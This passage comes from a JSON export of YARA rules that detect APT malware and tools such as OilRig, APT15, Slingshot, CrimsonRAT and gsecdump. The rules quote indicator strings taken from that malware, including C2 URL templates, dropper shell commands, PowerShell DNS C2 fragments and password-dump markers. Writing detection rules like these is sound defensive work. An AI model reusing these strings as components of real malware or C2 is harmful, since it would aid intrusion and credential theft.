Mimikatz Version","minimum_yara":"1.7","name":"Chafer_Mimikatz_Custom_RID2FD9","reference":"https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf","required_modules":[],"rule_hash":"166ac77cb3969436b74d66d7f8b97c70","score":75,"tags":["T1178","T1097","T1075","DEMO","T1003","FILE","MIDDLE_EAST","APT","EXE"]},{"author":"Markus Neis","content":"rule Chafer_Exploit_Copyright_2017_RID31DF : APT DEMO EXE FILE MIDDLE_EAST {\n   meta:\n      description = \"Detects Oilrig Internet Server Extension with Copyright (C) 2017 Exploit\"\n      author = \"Markus Neis\"\n      reference = \"https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf\"\n      date = \"2018-03-22 13:41:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"test3 Internet Server Extension\" fullword wide\n      $x2 = \"Copyright (C) 2017 Exploit\" fullword wide\n      $a1 = \"popen() failed!\" fullword ascii\n      $a2 = \"cmd2cmd=\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and ( 1 of ( $x* ) or all of ( $a* ) )\n}","date":"2018-03-22 13:41:01","description":"Detects Oilrig Internet Server Extension with Copyright (C) 2017 Exploit","minimum_yara":"1.7","name":"Chafer_Exploit_Copyright_2017_RID31DF","reference":"https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf","required_modules":[],"rule_hash":"a8e4b99feb76c0df7a72b3b748679c5a","score":75,"tags":["APT","DEMO","EXE","FILE","MIDDLE_EAST"]},{"author":"Markus Neis","content":"rule Oilrig_Myrtille_RID2D28 : APT DEMO EXE FILE T1076 {\n   meta:\n      description = \"Detects Oilrig Myrtille RDP Browser\"\n      author = \"Markus Neis\"\n      reference = \"https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf\"\n      date = \"2018-03-22 10:19:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, T1076\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\obj\\\\Release\\\\Myrtille.Services.pdb\" fullword ascii\n      $x2 = \"Failed to notify rdp client process exit (MyrtilleAppPool down?), remote session {0} ({1})\" fullword wide\n      $x3 = \"Started rdp client process, remote session {0}\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and 1 of them\n}","date":"2018-03-22 10:19:51","description":"Detects Oilrig Myrtille RDP Browser","minimum_yara":"1.7","name":"Oilrig_Myrtille_RID2D28","reference":"https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf","required_modules":[],"rule_hash":"035870b67960f2d791242558e3a53232","score":75,"tags":["APT","T1076","EXE","DEMO","FILE"]},{"author":"Florian Roth, Markus Neis","content":"rule Chafer_Packed_Mimikatz_RID2FA6 : APT DEMO EXE FILE MIDDLE_EAST T1003 T1045 T1075 T1097 T1178 {\n   meta:\n      description = \"Detects Oilrig Packed Mimikatz also detected as Chafer_WSC_x64 by FR\"\n      author = \"Florian Roth, Markus Neis\"\n      reference = \"https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf\"\n      date = \"2018-03-22 12:06:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MIDDLE_EAST, T1003, T1045, T1075, T1097, T1178\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Windows Security Credentials\" fullword wide\n      $s2 = \"Minisoft\" fullword wide\n      $x1 = \"Copyright (c) 2014 - 2015 Minisoft\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( all of ( $s* ) or $x1 )\n}","date":"2018-03-22 12:06:11","description":"Detects Oilrig Packed Mimikatz also detected as Chafer_WSC_x64 by FR","minimum_yara":"1.7","name":"Chafer_Packed_Mimikatz_RID2FA6","reference":"https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf","required_modules":[],"rule_hash":"a7db6463555c66249169c9de91d77e13","score":75,"tags":["T1178","T1097","T1075","DEMO","T1003","FILE","MIDDLE_EAST","APT","T1045","EXE"]},{"author":"Markus Neis","content":"rule Oilrig_PS_CnC_RID2BCC : APT DEMO T1086 {\n   meta:\n      description = \"Powershell CnC using DNS queries\"\n      author = \"Markus Neis\"\n      reference = \"https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf\"\n      date = \"2018-03-22 09:21:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"(-join $base32filedata[$uploadedCompleteSize..$($uploadedCompleteSize\" fullword ascii\n      $s2 = \"$hostname = \\\"D\\\" + $fileID + (-join ((65..90) + (48..57) + (97..122)|\" ascii\n   condition: \n      filesize < 40KB and 1 of them\n}","date":"2018-03-22 09:21:51","description":"Powershell CnC using DNS queries","minimum_yara":"1.7","name":"Oilrig_PS_CnC_RID2BCC","reference":"https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf","required_modules":[],"rule_hash":"48df4a66976b9a04bc0476b50f39cebe","score":75,"tags":["APT","DEMO","T1086"]},{"author":"Florian Roth","content":"rule TA18_074A_scripts_RID2CB1 : APT DEMO {\n   meta:\n      description = \"Detects malware mentioned in TA18-074A\"\n      author = \"Florian Roth\"\n      reference = \"https://www.us-cert.gov/ncas/alerts/TA18-074A\"\n      date = \"2018-03-16 10:00:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Running -s cmd /c query user on \" ascii\n   condition: \n      filesize < 600KB and 2 of them\n}","date":"2018-03-16 10:00:01","description":"Detects malware mentioned in TA18-074A","minimum_yara":"1.7","name":"TA18_074A_scripts_RID2CB1","reference":"https://www.us-cert.gov/ncas/alerts/TA18-074A","required_modules":[],"rule_hash":"15e9e3122af3d2155ccd51db2f34284b","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule TA18_074A_screen_RID2C29 : APT DEMO EXE FILE T1113 {\n   meta:\n      description = \"Detects malware mentioned in TA18-074A\"\n      author = \"Florian Roth\"\n      reference = \"https://www.us-cert.gov/ncas/alerts/TA18-074A\"\n      date = \"2018-03-16 09:37:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, T1113\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"screen.exe\" fullword wide\n      $s2 = \"PlatformInvokeUSER32\" fullword ascii\n      $s3 = \"GetDesktopImageF\" fullword ascii\n      $s4 = \"PlatformInvokeGDI32\" fullword ascii\n      $s5 = \"Too many arguments, going to store in current dir\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 60KB and 3 of them\n}","date":"2018-03-16 09:37:21","description":"Detects malware mentioned in TA18-074A","minimum_yara":"1.7","name":"TA18_074A_screen_RID2C29","reference":"https://www.us-cert.gov/ncas/alerts/TA18-074A","required_modules":[],"rule_hash":"8856226c92431fc35f2f523d6fd0e8de","score":75,"tags":["APT","DEMO","EXE","T1113","FILE"]},{"author":"Florian Roth","content":"rule APT15_Malware_Mar18_RoyalCli_RID30EA : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from APT 15 report by NCC Group\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/HZ5XMN\"\n      date = \"2018-03-10 13:00:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\Release\\\\RoyalCli.pdb\" ascii\n      $s2 = \"%snewcmd.exe\" fullword ascii\n      $s3 = \"Run cmd error %d\" fullword ascii\n      $s4 = \"%s~clitemp%08x.ini\" fullword ascii\n      $s5 = \"run file failed\" fullword ascii\n      $s6 = \"Cmd timeout %d\" fullword ascii\n      $s7 = \"2 %s  %d 0 %d\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them\n}","date":"2018-03-10 13:00:11","description":"Detects malware from APT 15 report by NCC Group","minimum_yara":"1.7","name":"APT15_Malware_Mar18_RoyalCli_RID30EA","reference":"https://goo.gl/HZ5XMN","required_modules":[],"rule_hash":"73c96ae158f506c87d0537333b80e3c5","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule APT15_Malware_Mar18_RoyalDNS_RID30B7 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from APT 15 report by NCC Group\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/HZ5XMN\"\n      date = \"2018-03-10 12:51:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"del c:\\\\windows\\\\temp\\\\r.exe /f /q\" fullword ascii\n      $x2 = \"%s\\\\r.exe\" fullword ascii\n      $s1 = \"rights.dll\" fullword ascii\n      $s2 = \"\\\"%s\\\">>\\\"%s\\\"\\\\s.txt\" fullword ascii\n      $s3 = \"Nwsapagent\" fullword ascii\n      $s4 = \"%s\\\\r.bat\" fullword ascii\n      $s5 = \"%s\\\\s.txt\" fullword ascii\n      $s6 = \"runexe\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( ( pe.exports ( \"RunInstallA\" ) and pe.exports ( \"RunUninstallA\" ) ) or 1 of ( $x* ) or 2 of them )\n}","date":"2018-03-10 12:51:41","description":"Detects malware from APT 15 report by NCC Group","minimum_yara":"1.7","name":"APT15_Malware_Mar18_RoyalDNS_RID30B7","reference":"https://goo.gl/HZ5XMN","required_modules":["pe"],"rule_hash":"9c2fb9f5dba2cbf05cd3a259aa9b453d","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule APT15_Malware_Mar18_BS2005_RID2F27 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from APT 15 report by NCC Group\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/HZ5XMN\"\n      date = \"2018-03-10 11:45:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"AAAAKQAASCMAABi+AABnhEBj8vep7VRoAEPRWLweGc0/eiDrXGajJXRxbXsTXAcZAABK4QAAPWwAACzWAAByrg==\" fullword ascii\n      $x2 = \"AAAAKQAASCMAABi+AABnhKv3kXJJousn5YzkjGF46eE3G8ZGse4B9uoqJo8Q2oF0AABK4QAAPWwAACzWAAByrg==\" fullword ascii\n      $a1 = \"http://%s/content.html?id=%s\" fullword ascii\n      $a2 = \"http://%s/main.php?ssid=%s\" fullword ascii\n      $a3 = \"http://%s/webmail.php?id=%s\" fullword ascii\n      $a9 = \"http://%s/error.html?tab=%s\" fullword ascii\n      $s1 = \"%s\\\\~tmp.txt\" fullword ascii\n      $s2 = \"%s /C %s >>\\\"%s\\\" 2>&1\" fullword ascii\n      $s3 = \"DisableFirstRunCustomize\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( 1 of ( $x* ) or 2 of them )\n}","date":"2018-03-10 11:45:01","description":"Detects malware from APT 15 report by NCC Group","minimum_yara":"1.7","name":"APT15_Malware_Mar18_BS2005_RID2F27","reference":"https://goo.gl/HZ5XMN","required_modules":[],"rule_hash":"f16b4312e0d0dde001dc6af87c8789b5","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule APT15_Malware_Mar18_MSExchangeTool_RID332C : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from APT 15 report by NCC Group\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/HZ5XMN\"\n      date = \"2018-03-10 14:36:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\Release\\\\EWSTEW.pdb\" ascii\n      $s2 = \"EWSTEW.exe\" fullword wide\n      $s3 = \"Microsoft.Exchange.WebServices.Data\" fullword ascii\n      $s4 = \"tmp.dat\" fullword wide\n      $s6 = \"/v or /t is null\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and all of them\n}","date":"2018-03-10 14:36:31","description":"Detects malware from APT 15 report by NCC Group","minimum_yara":"1.7","name":"APT15_Malware_Mar18_MSExchangeTool_RID332C","reference":"https://goo.gl/HZ5XMN","required_modules":[],"rule_hash":"63dd5feec94e34664b2264fdf8460484","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Slingshot_APT_Minisling_RID3019 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware from Slingshot APT\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/apt-slingshot/84312/\"\n      date = \"2018-03-09 12:25:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"{6D29520B-F138-442e-B29F-A4E7140F33DE}\" fullword ascii wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of them\n}","date":"2018-03-09 12:25:21","description":"Detects malware from Slingshot APT","minimum_yara":"1.7","name":"Slingshot_APT_Minisling_RID3019","reference":"https://securelist.com/apt-slingshot/84312/","required_modules":[],"rule_hash":"fa4196dfdc7819f93abff8916a2f2370","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule Slingshot_APT_Spork_Downloader_RID32EC : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware from Slingshot APT\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/apt-slingshot/84312/\"\n      date = \"2018-03-09 14:25:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Usage: spork -c IP:PORT\" fullword ascii wide\n      $s2 = \"connect-back IP address and port number\" \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of them\n}","date":"2018-03-09 14:25:51","description":"Detects malware from Slingshot APT","minimum_yara":"1.7","name":"Slingshot_APT_Spork_Downloader_RID32EC","reference":"https://securelist.com/apt-slingshot/84312/","required_modules":[],"rule_hash":"92f0ae2e94325e6244f3012b86d425d5","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule Slingshot_APT_Ring0_Loader_RID30E5 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware from Slingshot APT\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/apt-slingshot/84312/\"\n      date = \"2018-03-09 12:59:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \" -> Missing element in DataDir -- cannot install\" ascii\n      $s2 = \" -> Primary loader not present in the DataDir\" ascii\n      $s3 = \"\\\\\\\\.\\\\amxpci\" fullword ascii\n      $s4 = \" -> [Goad] ERROR in CreateFile:\" fullword ascii\n      $s5 = \"\\\\\\\\.\\\\Sandra\" fullword ascii\n      $s6 = \" -> [Sandra] RingZeroCode\" fullword ascii\n      $s7 = \" -> [Sandra] Value from IOCTL_RDMSR:\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of them\n}","date":"2018-03-09 12:59:21","description":"Detects malware from Slingshot APT","minimum_yara":"1.7","name":"Slingshot_APT_Ring0_Loader_RID30E5","reference":"https://securelist.com/apt-slingshot/84312/","required_modules":[],"rule_hash":"2000cb940b6139d1f0a7e90a4b8ad74c","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule Slingshot_APT_Malware_1_RID2FC8 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Slingshot APT\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/apt-slingshot/84312/\"\n      date = \"2018-03-09 12:11:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"SlingDll.dll\" fullword ascii\n      $s2 = \"BogusDll.\" ascii\n      $s3 = \"smsvcrt -h 0x%p\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and ( pe.imphash ( ) == \"7ead4bb0d752003ce7c062adb7ffc51a\" or pe.exports ( \"WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW0000\" ) or 1 of them )\n}","date":"2018-03-09 12:11:51","description":"Detects malware from Slingshot APT","minimum_yara":"1.7","name":"Slingshot_APT_Malware_1_RID2FC8","reference":"https://securelist.com/apt-slingshot/84312/","required_modules":["pe"],"rule_hash":"c51e9ed0d1f0dc1ba03736c59655279e","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Slingshot_APT_Malware_2_RID2FC9 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Slingshot APT\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/apt-slingshot/84312/\"\n      date = \"2018-03-09 12:12:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\\\\\?\\\\c:\\\\RECYCLER\\\\S-1-5-21-2225084468-623340172-1005306204-500\\\\INFO5\" fullword wide\n      $x_slingshot = {09 46 BE 57 42 DD 70 35 5E } \n      $s1 = \"Opening service %s for stop access failed.#\" fullword wide\n      $s2 = \"LanMan setting <%s> is ignored because system has a higher value already.\" fullword wide\n      $s3 = \"\\\\DosDevices\\\\amxpci\" fullword wide\n      $s4 = \"lNTLMqSpPD\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 900KB and ( 1 of ( $x* ) or 4 of them )\n}","date":"2018-03-09 12:12:01","description":"Detects malware from Slingshot APT","minimum_yara":"1.7","name":"Slingshot_APT_Malware_2_RID2FC9","reference":"https://securelist.com/apt-slingshot/84312/","required_modules":[],"rule_hash":"2851b18981c7241d29a82c2a7aed911f","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Slingshot_APT_Malware_3_RID2FCA : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Slingshot APT\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/apt-slingshot/84312/\"\n      date = \"2018-03-09 12:12:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"chmhlpr.dll\" fullword ascii\n      $s2 = \"%hc%hc%hc%hc\" fullword ascii\n      $s3 = \"%hc%hc%hc=\" fullword ascii\n      $s4 = \"%hc%hc==\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( pe.imphash ( ) == \"2f3b3df466e24e0792e0e90d668856bc\" or pe.exports ( \"dll_u\" ) or ( $a1 and 2 of ( $s* ) ) )\n}","date":"2018-03-09 12:12:11","description":"Detects malware from Slingshot APT","minimum_yara":"1.7","name":"Slingshot_APT_Malware_3_RID2FCA","reference":"https://securelist.com/apt-slingshot/84312/","required_modules":["pe"],"rule_hash":"8e0fa34cb8b4cd39d3572f05ce7bf481","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Slingshot_APT_Malware_4_RID2FCB : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Slingshot APT\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/apt-slingshot/84312/\"\n      date = \"2018-03-09 12:12:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Ss -a 4104 -s 257092 -o 8 -l 406016 -r 4096 -z 315440\" fullword wide\n      $s1 = \"Slingshot\" fullword ascii\n      $s2 = \"\\\\\\\\?\\\\e:\\\\$Recycle.Bin\\\\\" wide\n      $s3 = \"LineRecs.reloc\" fullword ascii\n      $s4 = \"EXITGNG\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( $x1 or 2 of them )\n}","date":"2018-03-09 12:12:21","description":"Detects malware from Slingshot APT","minimum_yara":"1.7","name":"Slingshot_APT_Malware_4_RID2FCB","reference":"https://securelist.com/apt-slingshot/84312/","required_modules":[],"rule_hash":"e123bb2724f6b06981f3def1a527a3fc","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule TSCookie_RAT_RID2B58 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects TSCookie RAT\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.jpcert.or.jp/2018/03/malware-tscooki-7aa0.html\"\n      date = \"2018-03-06 09:02:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[-] DecryptPassword_Outlook failed(err=%d)\" fullword ascii\n      $x2 = \"----------------------- Firefox Passwords ------------------\" fullword ascii\n      $x3 = \"--------------- Outlook Passwords ------------------\" fullword ascii\n      $x4 = \"----------------------- IE Passwords ------------------\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( ( pe.exports ( \"DoWork\" ) and pe.exports ( \"PrintF\" ) ) or 1 of them )\n}","date":"2018-03-06 09:02:31","description":"Detects TSCookie RAT","minimum_yara":"1.7","name":"TSCookie_RAT_RID2B58","reference":"http://blog.jpcert.or.jp/2018/03/malware-tscooki-7aa0.html","required_modules":["pe"],"rule_hash":"48c004c851054e842d3c6ca5e2596262","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule CrimsonRAT_Mar18_1_RID2D4B : DEMO EXE FILE MAL T1082 T1113 {\n   meta:\n      description = \"Detects CrimsonRAT malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-03-06 10:25:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, T1082, T1113\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run|\" wide\n      $x2 = \"\\\\Release\\\\RTLBot.pdb\" ascii\n      $x3 = \"cmd.exe/c systeminfo >> 1.txt\" fullword wide\n      $x4 = \"/online >> Get online target with important info\" fullword wide\n      $x5 = \"/screen >> ScreenShot from target PC\" fullword wide\n      $x6 = \"/restart >> Restart Target PC\" fullword wide\n      $x7 = \"/log_key >> Get log key file\" fullword wide\n      $a1 = \"get_ShiftKey\" fullword ascii\n      $a2 = \"get_ControlKey\" fullword ascii\n      $a3 = \"get_AltKey\" fullword ascii\n      $a4 = \"get_MineInterval\" fullword ascii\n      $fp1 = \"Copyright Software Secure\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( 1 of ( $x* ) or all of ( $a* ) ) and not 1 of ( $fp* )\n}","date":"2018-03-06 10:25:41","description":"Detects CrimsonRAT malware","minimum_yara":"1.7","name":"CrimsonRAT_Mar18_1_RID2D4B","reference":"Internal Research","required_modules":[],"rule_hash":"b94ecf53d3bcae109df1414b9f27486a","score":75,"tags":["T1113","MAL","DEMO","FILE","T1082","EXE"]},{"author":"Florian Roth","content":"rule Gsecdump_password_dump_file_RID322F : DEMO FILE SUSP T1003 {\n   meta:\n      description = \"Detects a gsecdump output file\"\n      author = \"Florian Roth\"\n      reference = \"https://t.co/OLIj1yVJ4m\"\n      date = \"2018-03-06 13:54:21\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SUSP, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Administrator(current):500:\" ascii\n   condition: \n      uint32be ( 0 ) == 0x41646d69 and filesize < 3000 and $x1 at 0\n}","date":"2018-03-06 13:54:21","description":"Detects a gsecdump output file","minimum_yara":"1.7","name":"Gsecdump_password_dump_file_RID322F","reference":"https://t.co/OLIj1yVJ4m","required_modules":[],"rule_hash":"fe3173f05892024b04af1dd50a629a5d","score":65,"tags":["SUSP","DEMO","T1003","FILE"]},{"author":"Florian Roth","content":"rule OpHoneybee_MaoCheng_Dropper_RID319B : APT DEMO EXE FILE MAL T1035 {\n   meta:\n      description = \"Detects MaoCheng dropper from Operation Honeybee\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/JAHZVL\"\n      date = \"2018-03-03 13:29:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1035\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\MaoCheng\\\\Release\\\\\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 1 of them\n}","date":"2018-03-03 13:29:41","description":"Detects MaoCheng dropper from Operation Honeybee","minimum_yara":"1.7","name":"OpHoneybee_MaoCheng_Dropper_RID319B","reference":"https://goo.gl/JAHZVL","required_modules":[],"rule_hash":"fd9c0d962db7d2f3b5b12cbf4ce75855","score":75,"tags":["T1035","MAL","DEMO","FILE","APT","EXE"]},{"author":"Florian Roth","content":"rule HoneyBee_Dropper_MalDoc_RID2FEA : APT DEMO FILE MAL T1035 T1047 T1057 {\n   meta:\n      description = \"Detects samples from Operation Honeybee\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/JAHZVL\"\n      date = \"2018-03-03 12:17:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, MAL, T1035, T1047, T1057\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"cmd /c expand %TEMP%\\\\setup.cab -F:* %SystemRoot%\\\\System32\" \n      $x2 = \"del /f /q %TEMP%\\\\setup.cab && cliconfg.exe\" \n      $s1 = \"SELECT * FROM Win32_Processor\" fullword ascii\n      $s2 = \"\\\"cmd /c `wusa \" fullword ascii\n      $s3 = \"sTempPathP\" fullword ascii\n      $s4 = \"sTempFile\" fullword ascii\n      $s5 = \"GetObjectz\" fullword ascii\n      $s6 = \"\\\\setup.cab\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0xcfd0 and filesize < 400KB and ( 1 of ( $x* ) or 4 of them )\n}","date":"2018-03-03 12:17:31","description":"Detects samples from Operation 